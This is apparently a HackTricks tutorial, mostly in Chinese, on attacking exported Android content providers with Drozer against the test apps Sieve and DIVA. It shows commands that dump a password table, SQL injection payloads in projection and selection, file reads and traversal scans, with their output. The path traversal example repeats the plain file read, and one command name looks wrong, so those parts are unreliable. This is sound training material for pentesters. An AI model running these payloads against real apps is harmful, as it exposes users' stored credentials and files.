# Exploiting Content Providers

## Exploiting Content Providers

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 介绍

内容提供者组件**在请求时向其他应用程序提供数据**。这些请求由ContentResolver类的方法处理。内容提供者可以使用不同的方式存储其数据，数据可以**存储**在**数据库**中，也可以存储在**文件**中，甚至可以通过**网络**存储。

它必须在_Manifest.xml_文件中声明。示例：
```markup
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
在这种情况下，需要权限`READ_KEYS`才能访问`content://com.mwr.example.sieve.DBContentProvider/Keys`\
（_此外，请注意在下一节中，我们将访问未受保护的`/Keys/`，这是因为开发人员混淆了保护`/Keys`但声明了`/Keys/`_）

**也许您可以访问私人数据或利用一些漏洞（如SQL注入或路径遍历）。**

## 从**暴露的内容提供者**获取信息
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
我们可以通过重建部分内容的URI来访问DBContentProvider，因为我们知道它们必须以"_content://"开头，并且通过Drozer在路径_/Keys_中获取的信息。

Drozer可以猜测并尝试多个URI：
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
你还应该检查**ContentProvider代码**以搜索查询：

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

此外，如果你找不到完整的查询，你可以**检查ContentProvider在`onCreate`方法中声明的名称**：

![](<../../../.gitbook/assets/image (186).png>)

查询将类似于：`content://name.of.package.class/declared_name`

## **基于数据库的Content Providers**

可能大多数Content Providers被用作**数据库**的**接口**。因此，如果你能够访问它，你就可以**提取、更新、插入和删除**信息。\
检查是否可以**访问敏感信息**或尝试更改它以**绕过授权**机制。

在检查Content Provider的代码时，还要查找名为_query、insert、update和delete_的**函数**：

![](<../../../.gitbook/assets/image (187).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

因为你将能够调用它们

### 查询内容
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### 插入内容

查询数据库后，您将了解到**列的名称**，然后可以将数据插入到数据库中：

![](<../../../.gitbook/assets/image (188) (1).png>)

![](<../../../.gitbook/assets/image (189) (1).png>)

_请注意，在插入和更新中，您可以使用--string表示字符串，--double表示双精度，--float，--integer，--long，--short，--boolean_

### 更新内容

知道列的名称后，您还可以**修改条目**：

![](<../../../.gitbook/assets/image (190).png>)

### 删除内容

![](<../../../.gitbook/assets/image (191).png>)

### **SQL注入**

通过操纵传递给内容提供程序的**投影**和**选择字段**，可以简单地测试SQL注入（SQLite）。\
在查询内容提供程序时，有两个有趣的参数可用于搜索信息：_--selection_ 和 _--projection_：

![](<../../../.gitbook/assets/image (192) (1).png>)

您可以尝试滥用这些**参数**来测试SQL注入：
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Drozer自动发现SQL注入漏洞**

Drozer is an Android security assessment framework that allows you to find security vulnerabilities in Android applications. One of the features of Drozer is the ability to automatically discover SQL injection vulnerabilities in Android applications.

Drozer是一个Android安全评估框架，可以帮助您发现Android应用程序中的安全漏洞。Drozer的一个功能是能够自动发现Android应用程序中的SQL注入漏洞。

SQL injection is a common vulnerability that occurs when an attacker is able to manipulate an SQL query in an application's database. This can lead to unauthorized access to sensitive data or even the ability to modify or delete data.

SQL注入是一种常见的漏洞，当攻击者能够操纵应用程序数据库中的SQL查询时，就会发生这种漏洞。这可能导致对敏感数据的未经授权访问，甚至能够修改或删除数据。

Drozer's SQL injection module allows you to automatically test an application's content providers for SQL injection vulnerabilities. Content providers are components in Android applications that allow data to be shared between different applications.

Drozer的SQL注入模块允许您自动测试应用程序的内容提供程序是否存在SQL注入漏洞。内容提供程序是Android应用程序中的组件，允许数据在不同应用程序之间共享。

To use Drozer's SQL injection module, you need to first install Drozer on your device and set up a connection between your device and the Drozer console on your computer. Once you have set up the connection, you can use the `run app.provider.sqlinjection` command in the Drozer console to automatically test an application's content providers for SQL injection vulnerabilities.

要使用Drozer的SQL注入模块，您首先需要在设备上安装Drozer，并在设备和计算机上的Drozer控制台之间建立连接。一旦建立了连接，您可以在Drozer控制台中使用`run app.provider.sqlinjection`命令，自动测试应用程序的内容提供程序是否存在SQL注入漏洞。

Drozer will automatically analyze the application's content providers and attempt to inject SQL queries to test for vulnerabilities. If a vulnerability is found, Drozer will provide you with information about the vulnerability, including the affected content provider and the SQL query that triggered the vulnerability.

Drozer将自动分析应用程序的内容提供程序，并尝试注入SQL查询以测试漏洞。如果发现漏洞，Drozer将提供有关漏洞的信息，包括受影响的内容提供程序和触发漏洞的SQL查询。

By using Drozer's SQL injection module, you can quickly and efficiently identify SQL injection vulnerabilities in Android applications, allowing you to take appropriate measures to secure the application and protect sensitive data.

通过使用Drozer的SQL注入模块，您可以快速高效地识别Android应用程序中的SQL注入漏洞，从而采取适当的措施保护应用程序并保护敏感数据。
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **基于文件系统的内容提供者**

内容提供者也可以用于访问文件：

![](<../../../.gitbook/assets/image (193).png>)

### 读取文件

您可以从内容提供者中读取文件
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **路径遍历**

如果你可以访问文件，你可以尝试滥用路径遍历（在这种情况下这并不是必要的，但你可以尝试使用"_../_"和类似的技巧）。
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**Drozer自动发现路径遍历漏洞**

Drozer is an Android security assessment framework that allows you to find security vulnerabilities in Android applications. One of the techniques it uses is automatic path traversal discovery.

Drozer是一个Android安全评估框架，可以帮助您发现Android应用程序中的安全漏洞。其中一种技术是自动发现路径遍历漏洞。

Path traversal vulnerabilities occur when an application allows user-controlled input to be used in file or directory paths without proper validation. This can lead to unauthorized access to sensitive files or directories on the device.

路径遍历漏洞发生在应用程序允许用户控制的输入在文件或目录路径中使用而没有进行适当的验证时。这可能导致未经授权访问设备上的敏感文件或目录。

Drozer's automatic path traversal discovery module helps identify such vulnerabilities by fuzzing different paths and checking for any unexpected behavior or access to restricted files.

Drozer的自动路径遍历发现模块通过对不同路径进行模糊测试，并检查是否存在任何意外行为或对受限文件的访问来帮助识别此类漏洞。

To use this module, you need to have a rooted Android device or an emulator with the Drozer agent installed. Once you have the environment set up, you can run the following command to start the automatic path traversal discovery:

要使用此模块，您需要具有已安装Drozer代理的已root的Android设备或模拟器。设置好环境后，您可以运行以下命令来启动自动路径遍历发现：

```
dz> run app.provider.finduri
```

This command will fuzz different paths and check for any content provider URIs that may be vulnerable to path traversal attacks. The results will be displayed, indicating any potential vulnerabilities found.

此命令将对不同的路径进行模糊测试，并检查是否存在可能受到路径遍历攻击的内容提供程序URI。结果将显示出来，指示是否发现了任何潜在的漏洞。

It is important to note that this module may generate a large number of requests, so it is recommended to use it on a test environment and with proper authorization.

需要注意的是，此模块可能会生成大量的请求，因此建议在测试环境中并且具有适当的授权下使用。

By using Drozer's automatic path traversal discovery module, you can efficiently identify and mitigate path traversal vulnerabilities in Android applications, enhancing their overall security.
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## 参考资料

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者想要**获取 PEASS 的最新版本或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
